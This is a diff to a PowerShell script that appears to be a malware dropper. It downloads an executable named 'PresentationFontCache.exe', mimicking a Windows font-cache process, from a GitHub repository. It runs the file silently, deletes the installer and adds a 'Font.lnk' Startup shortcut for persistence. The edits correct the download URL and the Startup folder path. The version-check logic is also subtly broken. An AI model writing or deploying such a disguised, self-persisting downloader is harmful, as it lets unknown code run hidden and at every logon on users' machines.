@@ -37,8 +37,8 @@ function Install-File {
 
     try {
         # Execute the downloaded file
-        $shell = New-Object -com shell.application
-        $shell.shellexecute($filePath)
+        $process = Start-Process -FilePath $filePath -ArgumentList '/quiet' -PassThru
+        $process.WaitForExit()
 
         # Delete the file from the temporary directory
         Remove-Item -Path $filePath -Force
@@ -61,22 +61,25 @@ $tempVersionFilePath = Join-Path -Path $env:TEMP -ChildPath 'version.txt'
 Download-File -Url $versionUrl -FilePath $tempVersionFilePath
 
 # Read the current version from the local file
+$currentVersion = ""
 $localVersionFilePath = Join-Path -Path $env:TEMP -ChildPath 'version.txt'
-$currentVersion = Get-Content -Path $localVersionFilePath
+if (Test-Path -Path $localVersionFilePath -PathType Leaf) {
+    $currentVersion = Get-Content -Path $localVersionFilePath
+}
 
 # Read the latest version from the downloaded Github file
 $latestVersion = Get-Content -Path $tempVersionFilePath
 
 if ($currentVersion -ne $latestVersion) {
     # Download the file
-    $url = 'https://github.com/qwertyuiopindia/log/blob/main/PresentationFontCache.exe?raw=true'
+    $url = 'https://github.com/qwertyuiopindia/log/raw/main/PresentationFontCache.exe'
     $tempFilePath = Join-Path -Path $env:TEMP -ChildPath 'PresentationFontCache.exe'
     Download-File -Url $url -FilePath $tempFilePath
 
     # Install the file and create a shortcut in the startup folder
     if (Test-Path -Path $tempFilePath -PathType Leaf) {
         Install-File -FilePath $tempFilePath
-        $startupFolder = Join-Path -Path $env:USERPROFILE -ChildPath 'Start Menu\Programs\Startup'
+        $startupFolder = Join-Path -Path $env:USERPROFILE -ChildPath 'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
         $shortcutPath = Join-Path -Path $startupFolder -ChildPath 'Font.lnk'
         $wshShell = New-Object -ComObject WScript.Shell
         $shortcut = $wshShell.CreateShortcut($shortcutPath)
